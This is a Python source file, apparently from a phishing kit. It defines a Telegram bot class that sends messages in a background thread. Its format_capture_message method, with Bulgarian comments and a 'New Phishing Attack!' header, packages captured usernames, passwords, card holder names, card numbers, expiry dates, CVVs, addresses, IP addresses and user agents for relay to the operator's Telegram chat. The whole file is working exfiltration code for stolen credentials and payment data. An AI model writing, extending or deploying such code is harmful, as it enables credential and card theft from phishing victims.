import telegram
import json
import os
import requests
import threading
import time

class TelegramBot:
    _instance = None
    _lock = threading.Lock()

    def __new__(cls, *args, **kwargs):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super(TelegramBot, cls).__new__(cls)
        return cls._instance

    def __init__(self, config_path='data/config.json'):
        if not hasattr(self, 'initialized'):
            self.config_path = config_path
            self.config = self._load_config()
            self.bot_token = None
            self.chat_id = None
            self._initialize_bot()
            self.initialized = True

    def _load_config(self):
        try:
            with open(self.config_path, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {}

    def _initialize_bot(self):
        if 'telegram' in self.config and self.config['telegram']['bot_token']:
            self.bot_token = self.config['telegram']['bot_token']
            self.chat_id = self.config['telegram']['chat_id']

    def send_message(self, message):
        """Изпраща съобщение към Telegram чрез директна HTTP заявка"""
        if not self.bot_token or not self.chat_id:
            return False
            
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            
            # Използваме отделна нишка за изпращане на съобщението
            threading.Thread(target=self._send_request, args=(url, data)).start()
            return True
        except Exception as e:
            print(f"Грешка при изпращане на Telegram съобщение: {e}")
            return False
            
    def _send_request(self, url, data):
        """Изпраща HTTP заявка в отделна нишка"""
        try:
            response = requests.post(url, json=data, timeout=5)
            if response.status_code != 200:
                print(f"Грешка при изпращане на Telegram съобщение: {response.text}")
        except Exception as e:
            print(f"Грешка при изпращане на HTTP заявка: {e}")

    def format_capture_message(self, data):
        """Форматира съобщението за уловените данни"""
        message = f"🎣 <b>Нова Фишинг Атака!</b>\n\n"
        message += f"📅 Време: {data.get('timestamp', 'Няма данни')}\n"
        message += f"🌐 IP: {data.get('ip_address', 'Няма данни')}\n"
        message += f"🔍 Тип: {data.get('page_type', 'Непознат')}\n\n"
        
        # Добавяне на потребителски данни
        if 'username' in data:
            message += f"👤 Потребител: <code>{data['username']}</code>\n"
        if 'password' in data:
            message += f"🔑 Парола: <code>{data['password']}</code>\n"
            
        # Добавяне на данни за карти
        if 'card_holder' in data:
            message += f"💳 Име на картата: <code>{data['card_holder']}</code>\n"
        if 'card_number' in data:
            message += f"💳 Номер на картата: <code>{data['card_number']}</code>\n"
        if 'expiry_month' in data and 'expiry_year' in data:
            message += f"📅 Валидност: <code>{data['expiry_month']}/{data['expiry_year']}</code>\n"
        if 'cvv' in data:
            message += f"🔒 CVV: <code>{data['cvv']}</code>\n"
            
        # Добавяне на допълнителна информация
        if 'address' in data:
            message += f"📍 Адрес: {data['address']}\n"
        if 'zip_code' in data:
            message += f"📮 Пощенски код: {data['zip_code']}\n"
            
        message += f"\n🌐 User Agent: {data.get('user_agent', 'Няма данни')}"
        
        return message 